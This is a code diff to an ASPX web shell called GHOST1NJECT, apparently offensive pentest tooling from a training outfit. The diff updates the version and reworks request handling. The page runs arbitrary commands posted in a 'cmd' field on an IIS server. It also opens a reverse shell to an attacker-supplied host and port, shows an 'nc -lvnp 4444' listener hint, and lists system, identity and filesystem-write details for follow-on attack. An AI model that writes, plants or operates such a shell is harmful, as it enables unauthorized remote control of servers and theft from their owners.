@@ -4,7 +4,7 @@
  Windows ASPX IIS Terminal + Evidence Panel
 ===============================================================================
 
- Version     : 1.9.1
+ Version     : 1.9.2
  Author      : Lucas Diniz
  Organization: Prodigium Academy
 
@@ -353,27 +353,64 @@ private void LoadEvidence(){
     UsersHtml=GetLocalUsers();
 }
 
+private bool RawResponse=false;
+
+protected override void Render(System.Web.UI.HtmlTextWriter writer){
+    // CompleteRequest() does not stop the WebForms rendering phase.
+    // Suppress page markup for AJAX-style POST responses so only the
+    // command/callback result is returned to the terminal.
+    if(RawResponse) return;
+    base.Render(writer);
+}
+
 void Page_Load(object sender,EventArgs e){
     Response.ContentEncoding=System.Text.Encoding.UTF8;
+
     if(Request.HttpMethod=="POST" && Request.Form["cmd"]!=null){
-        Response.ContentType="text/plain"; string cmd=Request.Form["cmd"]??""; string cdResult;
-        if(ChangeDirectory(cmd,out cdResult)) Response.Write(cdResult); else if(cmd.Trim().Equals("pwd",StringComparison.OrdinalIgnoreCase)) Response.Write(GetCwd()); else Response.Write(ExecuteCommand(cmd,GetCwd()));
-        Context.ApplicationInstance.CompleteRequest(); return;
+        RawResponse=true;
+        Response.Clear();
+        Response.ContentType="text/plain";
+
+        string cmd=Request.Form["cmd"]??"";
+        string cdResult;
+
+        if(ChangeDirectory(cmd,out cdResult))
+            Response.Write(cdResult);
+        else if(cmd.Trim().Equals("pwd",StringComparison.OrdinalIgnoreCase))
+            Response.Write(GetCwd());
+        else
+            Response.Write(ExecuteCommand(cmd,GetCwd()));
+
+        Context.ApplicationInstance.CompleteRequest();
+        return;
     }
+
     if(Request.HttpMethod=="POST" && Request.Form["rev_host"]!=null && Request.Form["rev_port"]!=null){
-        Response.ContentType="text/plain"; string host=(Request.Form["rev_host"]??"").Trim(); int port; bool validPort=Int32.TryParse(Request.Form["rev_port"],out port)&&port>0&&port<=65535;
-        IPAddress parsedIp; bool validHost=IPAddress.TryParse(host,out parsedIp) || Uri.CheckHostName(host)!=UriHostNameType.Unknown;
-        Response.Write(validPort&&validHost&&StartReverseShell(host,port)?"OK":"FAIL"); Context.ApplicationInstance.CompleteRequest(); return;
+        RawResponse=true;
+        Response.Clear();
+        Response.ContentType="text/plain";
+
+        string host=(Request.Form["rev_host"]??"").Trim();
+        int port;
+        bool validPort=Int32.TryParse(Request.Form["rev_port"],out port)&&port>0&&port<=65535;
+        IPAddress parsedIp;
+        bool validHost=IPAddress.TryParse(host,out parsedIp) || Uri.CheckHostName(host)!=UriHostNameType.Unknown;
+
+        Response.Write(validPort&&validHost&&StartReverseShell(host,port)?"OK":"FAIL");
+        Context.ApplicationInstance.CompleteRequest();
+        return;
     }
-    Response.ContentType="text/html"; LoadEvidence();
+
+    Response.ContentType="text/html";
+    LoadEvidence();
 }
 </script>
 <!doctype html><html><head><meta charset="utf-8"><title>GHOST1NJECT | Windows ASPX Terminal + Panel</title><style>
 *{margin:0;padding:0;box-sizing:border-box}body{background:#0a0e0a;color:#0f0;font:13px 'Courier New',monospace;height:100vh;display:flex;flex-direction:column}.hdr,.banner{background:#1a1e1a;padding:6px 12px;border-bottom:1px solid #0f0}.hdr{display:flex;justify-content:space-between}.banner{text-align:center}.main{display:flex;flex:1;overflow:hidden}.termwrap{flex:2;display:flex;flex-direction:column;border-right:1px solid #0f0}.term{flex:1;overflow:auto;padding:10px;white-space:pre-wrap;word-break:break-all}.promptrow{display:flex;gap:8px;padding:8px 12px;border-top:1px solid #0f0}.cmd{flex:1;background:transparent;border:0;color:#0f0;font:13px 'Courier New';outline:0}.panelwrap{flex:1;overflow:auto}.panel{padding:12px}h3{font-size:14px;border-bottom:1px solid #0f0;padding-bottom:4px}h4{color:#ff0;margin:13px 0 5px;font-size:12px}.item{font-size:11px;margin:3px 0;word-break:break-all}.box{background:#1a1e1a;padding:8px;margin:10px 0;border-left:3px solid #0f0}button,input{background:#1a1e1a;color:#0f0;border:1px solid #0f0;padding:5px 8px}button{cursor:pointer}.panel input,.panel button{width:100%;margin-bottom:7px}.green{color:#0f0}.red{color:#f66}.yellow{color:#ff0}.muted{color:#aaa}.line{margin-bottom:2px}.status{font-size:11px}
 </style></head><body>
-<div class="banner"><span class="green">[+] GHOST1NJECT Windows ASPX v1.9.1</span> | <span class="yellow">IIS Terminal</span> | <span class="green">Persistent Shell + Compatible Relay</span></div>
+<div class="banner"><span class="green">[+] GHOST1NJECT Windows ASPX v1.9.2</span> | <span class="yellow">IIS Terminal</span> | <span class="green">Persistent Shell + Compatible Relay</span></div>
 <div class="hdr"><span>ghost1nject@<%=H(Machine)%></span><span class="status">ONLINE | <%=H(UserName)%></span></div>
-<div class="main"><div class="termwrap"><div class="term" id="terminal"><div class="line">[+] GHOST1NJECT Windows ASPX v1.9.1</div><div class="line">[+] System: <%=H(OsInfo)%></div><div class="line">[+] User: <%=H(UserName)%></div><div class="line" id="cwdLine">[+] Directory: <%=H(Cwd)%></div><div class="line">[+] .NET: <%=H(DotNet)%></div><div class="line">---</div><div class="line">[*] Web terminal keeps directory changes between commands</div><div class="line">[*] Reverse shell: persistent shell with guaranteed output drain</div><div class="line">---</div></div><div class="promptrow"><span>PS&gt;</span><input id="cmdInput" class="cmd" autofocus autocomplete="off"><button id="clearBtn">Clear</button></div></div>
+<div class="main"><div class="termwrap"><div class="term" id="terminal"><div class="line">[+] GHOST1NJECT Windows ASPX v1.9.2</div><div class="line">[+] System: <%=H(OsInfo)%></div><div class="line">[+] User: <%=H(UserName)%></div><div class="line" id="cwdLine">[+] Directory: <%=H(Cwd)%></div><div class="line">[+] .NET: <%=H(DotNet)%></div><div class="line">---</div><div class="line">[*] Web terminal keeps directory changes between commands</div><div class="line">[*] Reverse shell: persistent shell with guaranteed output drain</div><div class="line">---</div></div><div class="promptrow"><span>PS&gt;</span><input id="cmdInput" class="cmd" autofocus autocomplete="off"><button id="clearBtn">Clear</button></div></div>
 <div class="panelwrap"><div class="panel"><h3>[#] REVERSE CALLBACK</h3><div class="box"><div>[*] Listener:</div><div class="yellow">nc -lvnp 4444</div></div><input id="revHost" placeholder="Your IP"><input id="revPort" placeholder="Port"><button id="startRevBtn">[+] START CALLBACK</button><div id="revMsg" class="item"></div>
 <h4>[+] SYSTEM INFO</h4><div class="item"><span class="yellow">OS:</span> <%=H(OsInfo)%></div><div class="item"><span class="yellow">Machine:</span> <%=H(Machine)%></div><div class="item"><span class="yellow">Identity:</span> <%=H(UserName)%></div><div class="item"><span class="yellow">Directory:</span> <%=H(Cwd)%></div><div class="item"><span class="yellow">.NET:</span> <%=H(DotNet)%></div><div class="item"><span class="yellow">IIS:</span> <%=H(Iis)%></div><div class="item"><span class="yellow">App Pool:</span> <%=H(AppPool)%></div><div class="item"><span class="yellow">Process:</span> <%=H(Arch)%></div>
 <h4>[+] FILESYSTEM / UPLOAD</h4><div class="item"><span class="yellow">Writable:</span> <%=Yn(Probe.Writable)%></div><div class="item"><span class="yellow">Create:</span> <%=Yn(Probe.Create)%> <span class="yellow">Delete:</span> <%=Yn(Probe.Delete)%></div><div class="item"><span class="yellow">Temp:</span> <%=H(TempDir)%></div><div class="item"><span class="yellow">ASP.NET max request:</span> <%=H(MaxRequest)%></div>
